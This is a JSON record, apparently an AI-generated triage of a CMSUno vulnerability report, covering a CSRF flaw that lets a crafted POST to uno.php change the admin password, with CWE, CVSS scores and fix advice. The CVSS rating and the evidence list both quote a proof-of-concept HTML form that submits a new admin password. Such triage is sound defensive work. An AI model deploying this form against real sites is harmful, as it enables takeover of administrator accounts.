@@ -1,0 +1,65 @@
+{
+  "proposal": {
+    "is_vulnerability_report": true,
+    "summary": "CMSUno before 1.6.1 (uno.php) is vulnerable to Cross-Site Request Forgery (CSRF) that allows changing the admin password via a crafted POST request.",
+    "affected_product": "CMSUno v1.6 (before 1.6.1)",
+    "cwe": "CWE-352",
+    "cwe_quote": "uno.php allows CSRF to change the admin password.",
+    "cvss": {
+      "AV": {
+        "value": "N",
+        "quote": "uno.php allows CSRF to change the admin password."
+      },
+      "AC": {
+        "value": "L",
+        "quote": ""
+      },
+      "PR": {
+        "value": "N",
+        "quote": ""
+      },
+      "UI": {
+        "value": "R",
+        "quote": "PoC :\n\n<html>\n<body>\n<script>history.pushState(\",\",'/')</script>\n<form action=\u201chttp://127.0.0.1/cmsuno-master/uno.php\u201dmethod=\u201cPOST\u201d>\n<input type=\u201chidden\u201d name=\u201cuser\u201d value=\u201cadmin\u201d/>\n<input type=\u201chidden\u201d name=\u201cpass\u201d value=\u201cyourpassword\u201d/>\n<input type=\u201csubmit\u201d name=\u201cuser\u201d value=\u201cSubmit request\u201d/>\n</form>\n</body>\n</html>"
+      },
+      "S": {
+        "value": "U",
+        "quote": ""
+      },
+      "C": {
+        "value": "H",
+        "quote": "uno.php allows CSRF to change the admin password."
+      },
+      "I": {
+        "value": "H",
+        "quote": "uno.php allows CSRF to change the admin password."
+      },
+      "A": {
+        "value": "N",
+        "quote": ""
+      }
+    },
+    "recommended_next_step": "Verify the vulnerable endpoint uno.php and implement CSRF protection (e.g., per-request CSRF tokens) and require authentication for password changes; notify users to update to 1.6.1.",
+    "confidence": "high",
+    "evidence_quotes": [
+      {
+        "claim": "Vulnerability description",
+        "quote": "uno.php allows CSRF to change the admin password."
+      },
+      {
+        "claim": "Affected versions",
+        "quote": "An issue was discovered in CMSUno before 1.6.1."
+      },
+      {
+        "claim": "Proof of concept demonstrates POST to uno.php to change admin password",
+        "quote": "<html>\n<body>\n<script>history.pushState(\",\",'/')</script>\n<form action=\u201chttp://127.0.0.1/cmsuno-master/uno.php\u201dmethod=\u201cPOST\u201d>\n<input type=\u201chidden\u201d name=\u201cuser\u201d value=\u201cadmin\u201d/>\n<input type=\u201chidden\u201d name=\u201cpass\u201d value=\u201cyourpassword\u201d/>\n<input type=\u201csubmit\u201d name=\u201cuser\u201d value=\u201cSubmit request\u201d/>\n</form>\n</body>\n</html>"
+      }
+    ]
+  },
+  "usage": {
+    "input_tokens": 1630,
+    "output_tokens": 711,
+    "latency_s": null,
+    "batch": true
+  }
+}
